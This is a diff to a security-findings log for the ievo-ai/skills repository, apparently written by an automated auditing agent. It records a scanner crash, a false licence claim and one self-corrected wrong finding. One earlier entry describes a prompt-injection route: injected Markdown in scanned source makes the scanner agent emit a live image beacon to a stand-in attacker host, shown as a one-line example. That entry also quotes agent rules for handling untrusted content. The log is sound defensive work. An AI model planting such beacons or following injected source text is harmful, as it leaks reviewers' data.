@@ -1976,7 +1976,7 @@ discovered_at: 2026-07-15T08:31:51Z
 run_id: manual-research-session-2026-07-15
 target_repo: ievo-ai/skills
 title: scan_repo.mjs's isOversized() reports st_size=0 for character-device/FIFO/socket targets, so a symlink to /dev/zero bypasses the v0.51.3 (#374) 256KB size-cap guard at all 4 readFileSync call sites and hangs the scanner on an infinite, non-EOF-terminating read
-status: issued
+status: rejected
 issue_url: https://github.com/ievo-ai/skills/issues/381
 cwe: CWE-400
 confidence: high
@@ -2046,7 +2046,7 @@ discovered_at: 2026-07-16T08:35:00Z
 run_id: 29483105364
 target_repo: ievo-ai/skills
 title: init/references/security-report-flow.md Step 2's code fence shows `gh issue create --title <report_template.title>` completely unquoted, contradicting its own very next paragraph's "never substitute the title directly via shell" warning
-status: issued
+status: rejected
 issue_url: https://github.com/ievo-ai/skills/issues/393
 cwe: CWE-78
 confidence: medium
@@ -2105,6 +2105,59 @@ location: plugins/ievo/agents/vuln-scanner.md (output JSON schema); plugins/ievo
 ```
 
 Self-verified directly against current source: `security-auditor.md` has an explicit "Excerpt containment" rule (lines 111-128) requiring any verbatim quote of untrusted candidate content placed into `report_template.body` to be wrapped in a backtick code span (with a nested-code-span-safe backtick run) before it is filed as a public GitHub issue — this was added by the already-closed #350. `vuln-scanner.md` has no equivalent instruction anywhere — only a generic "treat file content as untrusted... flag as injection category" note (line 57) with nothing about neutralizing Markdown syntax in quoted excerpts before they're written into structured JSON findings (`title`, `exploit_chain.*`, `recommendation` fields). `vuln-scan.md`'s Phase 4 "Present results" (lines 201-217) then renders every finding field directly as Markdown with no escaping step anywhere in the file (grepped for "containment"/"code span"/"backtick" — zero matches). vuln-scanner.md's own mindset section explicitly anticipates prompt injection in scanned source and its "cite specifically" rule (file + line + function per finding) pushes toward quoting source verbatim — exactly the pattern #350 closed off for security-auditor.md, left open here. If a scanned module (a compromised dependency, adversarial upstream plugin, or crafted test fixture) contains source with embedded Markdown image/link syntax (`![x](https://attacker.tld/beacon?d=...)`), a scanner citing it as evidence in a finding can produce a live-rendering exfiltration beacon or spoofed link the moment a human reviews the findings in a Markdown-aware surface (the Claude Code chat UI itself). Not a duplicate of #350 (security-auditor.md/report_template.body only, already fixed) or #200 (vuln-scan/SKILL.md secret-exposure pre-classification, a different concern). Recommendation: apply the same fix #350 already shipped for `report_template.body` — require any verbatim source excerpt placed into a vuln-scanner finding field to be wrapped in a backtick code span (one backtick longer than the longest run already inside the excerpt) before it is written into the JSON or rendered in Phase 4.
+
+## S-2026-07-23-001 — cut-release.yml's App-token mint has no owner:/repositories: scoping, unlike its three sibling workflows
+
+```yaml
+id: S-2026-07-23-001
+discovered_at: 2026-07-23T09:00:00Z
+run_id: 29991663925
+target_repo: ievo-ai/skills
+title: cut-release.yml's GitHub App token mint has no owner:/repositories: scoping, defaulting to the full App installation footprint
+status: rejected
+issue_url: https://github.com/ievo-ai/skills/issues/411
+cwe: CWE-269
+confidence: medium
+location: .github/workflows/cut-release.yml:138-144
+```
+
+Carried forward from the 2026-07-22 audit's Deferred findings (flagged as the top candidate for this run's security slots) and independently re-verified this run via direct diff against all three sibling workflows. `cut-release.yml:141-144` mints the `ievo-eva` GitHub App token (`actions/create-github-app-token@d72941d797fd3113feb6b93fd0dec494b13a2547`) with only `app-id`/`private-key` — no `owner:`/`repositories:` keys. The three sibling workflows minting the same App token (`notify-eva.yml:49-50`, `forward-to-eva.yml:67-68` — 3 call sites, `notify-release.yml:94-95`) all add explicit `owner: ievo-ai` + `repositories: eva,skills` (or `eva`). Per `actions/create-github-app-token`'s documented behavior, omitting both keys defaults the minted token to every repo the App installation can access — not just `ievo-ai/skills` — including `ievo-ai/eva`, which per this repo's own CLAUDE.md holds Eva's autonomous PR-authoring/auto-merge credentials. Today's `cut` job code scopes its own `gh` calls to `--repo "$REPO"`, so the excess scope isn't directly exercised by any primitive in this file today — this is a blast-radius amplifier (defense-in-depth gap), not a standalone RCE: any future code-execution or token-exfiltration bug introduced into this job would hand an attacker App-level access across the whole installation instead of just `ievo-ai/skills`.
+
+**REJECTED by Eva Router skeptic mode within ~2 minutes of filing (skills#411, closed `eva-rejected`).** The central claim was independently checked against the primary source and found factually wrong: `actions/create-github-app-token`'s `README.md` and `action.yml` (both on `main` AND at the exact pinned version `v1.12.0` used in `cut-release.yml`) state *"If `owner` and `repositories` are empty, access will be scoped to only the current repository"* — the opposite of what this finding (and the carried-forward July 22 note) claimed. Omitting `owner`/`repositories` in `cut-release.yml` does NOT over-scope the token to the full App installation; it defaults to `ievo-ai/skills` only, which is exactly the access the job needs. The sibling workflows add explicit `owner`/`repositories` because THEY need cross-repo access (dispatching to `ievo-ai/eva`), not because omitting the inputs would be unsafe. This finding — including its carried-forward version in the 2026-07-22 report's Deferred findings — was never independently verified against `actions/create-github-app-token`'s own documented default behavior; this run's vetting (Step 3b) confirmed the code-level fact (no `owner:`/`repositories:` keys present) but did not check the referenced action's actual behavior, exactly the gap CLAUDE.md's "Verify documentation before changing or asserting tool/library behavior" rule exists to close. Recorded here so this exact false claim does not resurface in a future run.
+
+## S-2026-07-23-002 — scan_repo.mjs's truncate() throws an uncaught TypeError on non-string JSON fields from a scanned repo (DoS)
+
+```yaml
+id: S-2026-07-23-002
+discovered_at: 2026-07-23T09:00:00Z
+run_id: 29991663925
+target_repo: ievo-ai/skills
+title: scan_repo.mjs's truncate() crashes with an uncaught TypeError on non-string truthy JSON values from scanned repo manifests
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/412
+cwe: CWE-20
+confidence: high
+location: plugins/ievo/scripts/scan_repo.mjs:281-289 (sinks at 425, 463, 491)
+```
+
+Self-verified directly: `truncate(text, limit)` (line 281-289) does `if (!text) return "";` then unconditionally `text.replace(/\s+/g, " ")` (line 283) with no type check. A scanned repo's `.claude-plugin/plugin.json` `description` (sink at line 425), a `hooks.json` hook entry's `command`/`type` (sink at line 463), or a `.mcp.json` `url`/`command` (sink at line 491) set to any truthy non-string JSON value (a number, array, object, or `true`) passes the `!text` guard and then throws `TypeError: text.replace is not a function`, since none of those types have a `.replace` method. The exception is uncaught anywhere in `enumerateOnePlugin`/`enumerateHooks`/`enumerateMcp`/`main()`, crashing the process before `writeFileSync` runs — so a single attacker-controlled repo (community-index submission or a local `index-repos` run) aborts that repo's scan, and can abort a batch if the caller treats any non-zero exit as fatal. The sibling function `escapeMdCell()` (line 299-307) already hardened against this exact class of input with an explicit `String(text)` coercion (added per its own test "coerces non-string input to string"); `truncate()` was never given the equivalent fix, and `tests/scan_repo.test.mjs` only exercises `truncate()` with `null`/`undefined`/`""`/strings — the non-string-truthy case is untested.
+
+## S-2026-07-23-003 — scan_repo.mjs hardcodes license: "MIT" for any repo with a LICENSE file, regardless of its actual content
+
+```yaml
+id: S-2026-07-23-003
+discovered_at: 2026-07-23T09:00:00Z
+run_id: 29991663925
+target_repo: ievo-ai/skills
+title: scan_repo.mjs publishes a false "MIT" license claim to the public community index based on file presence alone, never file content
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/413
+cwe: CWE-345
+confidence: high
+location: plugins/ievo/scripts/scan_repo.mjs:818,830
+```
+
+Self-verified directly: line 818 only checks whether a file literally named `LICENSE`/`LICENSE.md`/`LICENSE.txt` exists (`fileExists`) — it never reads the file's content. Line 830 then unconditionally sets `license: licenseFileExists ? "MIT" : null` — a hardcoded SPDX identifier regardless of what the file actually says. This value flows straight into the public community index via `renderIndexMd` (`- **License:** ${data.license || "missing"}`) and the published JSON manifest entry that downstream tooling/UI consumes to help users decide whether it's safe to install/fork/redistribute a candidate. Any repo shipping a GPL, proprietary, or any non-MIT `LICENSE` file is falsely reported as MIT-licensed. This directly contradicts the repo's own stated security model (AGENTS.md § Security model: "No heuristic risk_tier in indices. `scan_repo.mjs` emits structural facts only.") — a hardcoded, content-unverified SPDX claim is not a structural fact. Confirmed not already tracked: `CHANGELOG.md`'s v0.52-era #365 entry notes `license`/`stars`/`created` were "intentionally left un-escaped" because `license` is "always a hardcoded MIT/null literal from a file-existence check (never file content)" — but that note addresses only the Markdown-injection/escaping question (a hardcoded literal needs no escaping), not the correctness/misrepresentation defect itself, which has no existing issue (`gh issue list --search "license"` returned no match on this specific gap).
 
 
 
